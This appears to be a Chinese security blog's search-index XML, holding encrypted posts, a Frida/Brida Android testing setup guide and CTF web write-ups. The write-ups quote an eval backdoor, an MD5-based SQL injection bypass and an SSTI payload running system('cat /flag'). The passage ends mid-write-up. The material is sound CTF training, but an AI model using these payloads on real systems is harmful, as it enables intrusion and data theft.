ot0CD999LyZ0K5tuGBSW/z809k05pp+uvr9hEJ54tluYVjPKzWXhpzQNrsF3eSxnL4ReHCC3WQKqzFeUpqr7p3hqkQ1aqizIQ51aellWKbUudxIfYWbf7/7MHBS90aAmlPMABT3Lwp00zBgZ6939au0yrZ84af17oNyP+2O/sejbTIyYod+4IyRv/FnJjzJJ50GYY34t53LX8iiKZ5yV9s7q+D++Ztik9Wlq7+9zC6oHos0TxbbHMCGRIhLgU1YnfzzsSVThS6VJmoniYSEa/zLxU7BU6p6cu/Z9lSqaxVAtgqdFmDu+oWEEfX/ot0ZrSRnvYZCnEC2uDK0pwhmRbBLxlfTEYzQ77UGtIT4rEW6sb9rjMzwtwOXKbwH/J/Nve/rBs/U2LtEFUjOID16ZFDxif5N3WU0TAJWCATu9zYeKUeRiBlCI64VlktNN4YluRW5sUIV98aMKWyxJom0xtGYObtaO/RZyxryzaeGh3tD2A/G4sO6GfcNUK8JVGJq8LvO+18+3LKClgp8EuPKnHBqFrP2dlY7NYAju6/SmtsQcW8tAUalolblByuGevsm96KLvDK+MtUhMTEyzTOAg2tM/QS3l/QGyq1COWNW9cwEMrR9nds4PxA+SeXnvr9UbR+7Y8k6fAIct0pFXOkQrU5K6ODHIYKOcNFmFCiicW07DiBfJCsG5ClhT94s5M8Jspr+UZksIZ+LxBjWB8Z6yBjuZcZOruv+8MPT60Kp60pM4nhnnnLWZlZ3Luunf+BRTDc2UUqxzKbHTNIrrKi8oS8F/GIxW7SQFo5GRawmq9RU1fVvUKCpRHMmwisULcQtzb95Cn3UlcqpLhHQo4nMSg4lYb1kpPCD6jjAlfA5OGnXsvAWadfKYJaqscdQu8NJkkZXdKmxgnpwejHoxionXZQjPi2izqSAaEtEeSXt5+pu5Ragb+/gLDDUz7rvEyOH9rWokKvV2S6L7AwiFub0Ihn8obwG/FfZuveOa6mITyZSVbIuwisAidro4pEAaZg3m7s9b81RVUwy07CGSFnEyU/uTH/Tur2RbN625Wa9uiHHCMsCZR7yY0E04DpfflTsc4/LH/aKfi5weRjzPrJlGNCbgS+WHVfNvGyEHjAWUc/nHAvl1Sua8Ae/VEUUupEoUPTGEP2oJ+lh4UaieBYNFVUhApXGUDbIAWGfrLgfsSg1OV6fmqOb5yGYtACNFL365xJcrf7y2F7jRl8Z/8FT3xEW4/EQed1CsZNkdEc0rJpvTSB4kSJFg02VdVfMeYwO/Xl4jGcrP0qEbNt3TBEXs87ovbhyR8KBHxI1nwzWczqy7/qKGWy4/25Io69J9j/Mt5SOCUMoXl/OVv6z09nEdG7smi785xmaNFVdsRyDZTdy3yyWrjHk=</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
	document.getElementById("enc_error").innerHTML = "password error!"
};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
      <categories>
        <category>面试</category>
      </categories>
  </entry>
  <entry>
    <title>安卓渗透工具安装</title>
    <url>/2020/11/11/brida%20%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="brida-安卓渗透工具安装"><a href="#brida-安卓渗透工具安装" class="headerlink" title="brida 安卓渗透工具安装"></a>brida 安卓渗透工具安装</h1><p>阅读此文需要一点点基础，如有不懂，可直接私聊作者</p>
<p>进行安卓测试时，会出现一些数据包抓不到的情况，究其原因是因为做了https程序校验。此时brida就派上用场了。</p>
<h3 id="1-安装-pyro4"><a href="#1-安装-pyro4" class="headerlink" title="1. 安装 pyro4"></a>1. 安装 pyro4</h3><p>有python3环境的可以直接安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip3 install pyro4</span><br></pre></td></tr></table></figure>

<p>有python但是没有pip的例如mac os，执行下面的命令即可安装对应python版本的pip</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line">sudo python get-pip.py</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>注：没有python环境的直接去官网下载python安装包即可<strong>（建议3.8.6版本）</strong>，其他版本未测试</p>
<h3 id="2-安装frida-compile"><a href="#2-安装frida-compile" class="headerlink" title="2. 安装frida-compile"></a>2. 安装frida-compile</h3><p>进入nodejs<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">官网</a>找到对应版本直接下载，根据安装程序一直点击下一步即可</p>
<p>随后在控制台执行，<strong>在哪里执行，frida-compile就安装在哪里</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install frida-compile@9.5.2.  # 最新版本没有-x选项，作者说近段时间会更新一个没有-x选项的 brida，但是目前还没更新</span><br></pre></td></tr></table></figure>

<h3 id="3-安装frida"><a href="#3-安装frida" class="headerlink" title="3. 安装frida"></a>3. 安装frida</h3><p>在需要测试的地方pc上安装firda client</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 install -m pip frida</span><br></pre></td></tr></table></figure>

<p>前往frida <a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">github</a>上下载对应手机系统版本的frida-server</p>
<p>安卓64位手机一般是选择<a href="https://github.com/frida/frida/releases/download/14.0.8/frida-server-14.0.8-android-arm64.xz" target="_blank" rel="noopener">friida-server-14.0.8-android-arm64.xz</a></p>
<p>下载后解压，然后下载adb工具 前往<a href="https://developer.android.com/studio/releases/platform-tools" target="_blank" rel="noopener">官网</a>下载</p>
<p>使用电脑连接安卓手机（需要root）由于篇幅原因就不在展开如何root，<a href="https://developer.android.com/studio/debug/dev-options?hl=zh-cn" target="_blank" rel="noopener">开启开发者模式</a></p>
<p>使用控制台进入到adb的目录执行如下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>

<p>如果出现了设备，说明连接手机成功。</p>
<p>随后执行如下命令（需要将frida-server-14.0.8-android-arm64放入adb所在的目录中，知道frida-server的路径也可以直接使用frida-server的绝对路径，就不用移动文件了）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push frida-server-14.0.8-android-arm64 /data/<span class="built_in">local</span>/tmp <span class="comment">#将frida-server文件导入到手机</span></span><br><span class="line">adb shell   <span class="comment"># 执行完这条命了后即进入了手机的shell</span></span><br></pre></td></tr></table></figure>

<p>以下命令在手机的shell上执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">su <span class="comment">#获取root权限，执行后需要在手机上的root管理器允许</span></span><br><span class="line"><span class="built_in">cd</span> /data/<span class="built_in">local</span>/tmp</span><br><span class="line">chmod +x ./frida-server-14.0.8-android-arm64</span><br><span class="line">./frida-server-14.0.8-android-arm64 &amp;</span><br></pre></td></tr></table></figure>

<p>此时frida-server已经安装好，并已经运行</p>
<h3 id="4-安装brida"><a href="#4-安装brida" class="headerlink" title="4. 安装brida"></a>4. 安装brida</h3><p>打开burp suite  选择Extender-&gt;App store找到brida-&gt;点击安装即可</p>
<p>然后选择brida</p>
<p>第一项 <strong>python binary path</strong> 选择python的安装目录下的<code>python.exe</code>   win下默认安装路径 <em>C:\pyton3\python.exe</em></p>
<p>第二项<strong>pyro host</strong>  默认配置localhost即可</p>
<p>第三项 <strong>pyro port</strong>  默认配置9999即可</p>
<p>第四项  <strong>frida-compile path</strong> 选择当时安装frida-compile时的路径下的 <code>/node_modules/.bin/frida-compile</code></p>
<p>第五项 <strong>fridaJS file folder</strong> 随意选择一个具有可读写的目录，然后点击<code>load default js file</code></p>
<p>第六项 <strong>Application ID/PID</strong> 回到手机的shell，查看需要测试的程序运行的pid. 使用<code>frida-ps -U</code> 然后在列表中找到即可 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python binary path: &#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3(这里选择python可执行文件的位置)</span><br><span class="line">Pyro host: localhost</span><br><span class="line">pyro port: 9999</span><br><span class="line">frida-compile path: &#x2F;node_modules&#x2F;.bin&#x2F;frida-compile(这里选择刚才安装的.&#x2F;bin下面的frida-compile文件)</span><br><span class="line">fridaJS file folder: #这里存在的是将要执行的js代码</span><br><span class="line">Application ID&#x2F;PID: #这里填写要hook的pid</span><br></pre></td></tr></table></figure>

<h3 id="5-成功启动"><a href="#5-成功启动" class="headerlink" title="5.成功启动"></a>5.成功启动</h3><p>所有步骤做好了之后，依次点击    <code>start server</code>，    <code>attach application</code>出现如下结果说明成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Application with PID 3414 attached correctly    #此处的3414是被测试的程序的pid</span><br><span class="line">Platform: Android</span><br></pre></td></tr></table></figure>

<h3 id="6-遇到的问题"><a href="#6-遇到的问题" class="headerlink" title="6. 遇到的问题"></a>6. 遇到的问题</h3><h4 id="1、env-node-No-such-file-or-directorys"><a href="#1、env-node-No-such-file-or-directorys" class="headerlink" title="1、env: node: No such file or directorys"></a>1、env: node: No such file or directorys</h4><p>mac 执行如下命令 <code>sudo launchctl config user path/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin</code></p>
<h4 id="2-Unknown-option-x"><a href="#2-Unknown-option-x" class="headerlink" title="2. Unknown option -x"></a>2. Unknown option -x</h4><p>使用9.x版本，卸载最新的10.0版本，然后下载9.x版本即可</p>
<pre><code>npm uninstall frida-compile 
npm install frida-compile@9.5.2</code></pre><h4 id="3-Exception-with-attach-application"><a href="#3-Exception-with-attach-application" class="headerlink" title="3. Exception with attach application"></a>3. Exception with attach application</h4><p>net.razorvine.pyro.PyroException:     [frida.InvalidArgumentError] device not found   </p>
<p>设备未找到</p>
<p>net.razorvine.pyro.PyroException:     [frida.ProcessNotFoundError] unable to find process with pid 4908   </p>
<p>未找到此进程。重新检查程序pid，并重试 </p>
<h3 id="7-参考"><a href="#7-参考" class="headerlink" title="7. 参考"></a>7. 参考</h3><p><a href="https://developer.android.com/studio/debug/dev-options?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/studio/debug/dev-options?hl=zh-cn</a><br><a href="https://github.com/federicodotta/Brida/issues/67" target="_blank" rel="noopener">https://github.com/federicodotta/Brida/issues/67</a><br><a href="https://github.com/federicodotta/Brida/issues/47" target="_blank" rel="noopener">https://github.com/federicodotta/Brida/issues/47</a></p>
]]></content>
      <categories>
        <category>移动端测试</category>
      </categories>
      <tags>
        <tag>工具使用</tag>
        <tag>frida</tag>
      </tags>
  </entry>
  <entry>
    <title>GKCTF2019-web</title>
    <url>/2020/05/26/GKCTF2019-web/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="GKCTF2020-CheckIN"><a href="#GKCTF2020-CheckIN" class="headerlink" title="[GKCTF2020]CheckIN"></a>[GKCTF2020]CheckIN</h2><p>打开题目就有源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $code = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">public</span> $decode = <span class="keyword">null</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;code = @<span class="keyword">$this</span>-&gt;x()[<span class="string">'Ginkgo'</span>];</span><br><span class="line">                <span class="keyword">$this</span>-&gt;decode = @base64_decode( <span class="keyword">$this</span>-&gt;code );</span><br><span class="line">                @<span class="keyword">Eval</span>(<span class="keyword">$this</span>-&gt;decode);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> $_REQUEST;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> ClassName();</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>日常刷题</category>
      </categories>
      <tags>
        <tag>GKCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>长亭科技面经</title>
    <url>/2020/05/19/%E9%95%BF%E4%BA%AD%E7%A7%91%E6%8A%80%E9%9D%A2%E7%BB%8F/</url>
    <content><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">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</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
	document.getElementById("enc_error").innerHTML = "password error!"
};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
      <categories>
        <category>日常</category>
      </categories>
  </entry>
  <entry>
    <title>BJDCTF2020刷题记录</title>
    <url>/2020/05/13/BJDCTF2020%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h2><p>在题目返回的http header中给出了提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &#39;admin&#39; where password&#x3D;md5($pass,true)</span><br></pre></td></tr></table></figure>

<p>要使得某个字符串的md5值转字符串后出现形如 <code>&#39;or&#39;1</code></p>
<a id="more"></a>

<p>自己懒得跑了直接百度一个  来自<a href="https://blog.csdn.net/qq_24810241/article/details/79908449" target="_blank" rel="noopener">https://blog.csdn.net/qq_24810241/article/details/79908449</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ffifdyop</span><br><span class="line">md5(ffifdyop,32) &#x3D; 276f722736c95d99e921722cf9ed621c</span><br><span class="line">转成字符串为&#39;or&#39;6�]��!r,��b</span><br></pre></td></tr></table></figure>

<p>填入之后跳转到另一个界面，查看源码给出了提示</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET['a'];</span></span><br><span class="line"><span class="comment">$b = $_GET['b'];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p>传入数组绕过 <code>?a[]=0&amp;b[]=1</code></p>
<p>来到第三个页面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样可以使用数组绕过，也可以使用相同md5生成器<a href="http://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip" target="_blank" rel="noopener">fastcoll</a>生成两个相等md5，但是原始字符串不同</p>
<h2 id="Mark-loves-cat"><a href="#Mark-loves-cat" class="headerlink" title="Mark loves cat"></a>Mark loves cat</h2><p>扫描目录后发现存在git泄露</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;flag.php (CODE:200|SIZE:0)</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F;index (CODE:200|SIZE:5725)</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F;config (CODE:200|SIZE:137)</span><br><span class="line">+ http:&#x2F;&#x2F;2b40b993-f14f-44fa-b4ce-917ded21cb70.node3.buuoj.cn&#x2F;.git&#x2F; (CODE:403|SIZE:555)</span><br></pre></td></tr></table></figure>

<p>使用githack获取源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取到的index.php的部分关键代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;   <span class="comment">//$x=pkey $y=pvalue</span></span><br><span class="line">    $$x = $y;    <span class="comment">//$$x=$pkey = $y=pvalue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;   <span class="comment">//$x=gkey $y=gvalue</span></span><br><span class="line">    $$x = $$y;   $$flag=$$y=<span class="number">1</span>     <span class="comment">//$$x=$gkey = $gvalue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;   <span class="comment">//$x = gkey $y = $gvalue</span></span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;   </span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure>

<p>这个题目考点就是源码阅读,疯狂套娃。如上分析，POST传入的参数如果是flag，结过就是<code>$flag=pvalue</code>将导致<code>$flag</code>被覆盖。</p>
<p>如果POST传入的参数不能为flag，就在第二个判断条件终止。就要使得<code>$yds=$flag</code></p>
<p>在第二个foreach中恰好满足条件，GET传入yds=flag,然后就是不执行第一个判断语句。如果未传入参数，if就不会执行。</p>
<h2 id="The-mystery-of-ip"><a href="#The-mystery-of-ip" class="headerlink" title="The mystery of ip"></a>The mystery of ip</h2><p>打开题目是一个精美的界面</p>
<p><img src="/pic/160.png" alt=""></p>
<p>上面有一个flag.php，给出了ip地址，结合题目标题。添加一个X-Forwarded-For头部</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &#123;7*7&#125;</span><br></pre></td></tr></table></figure>

<p>页面变成了IP:49</p>
<p><img src="/pic/161.png" alt=""></p>
<p>是ssti没错了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入&#123;phpinfo()&#125;成功执行</span><br><span class="line"></span><br><span class="line">&#123;system(&quot;cat &#x2F;flag&quot;)&#125;  即可拿到flag</span><br></pre></td></tr></table></figure>

<h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><p>给出了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span 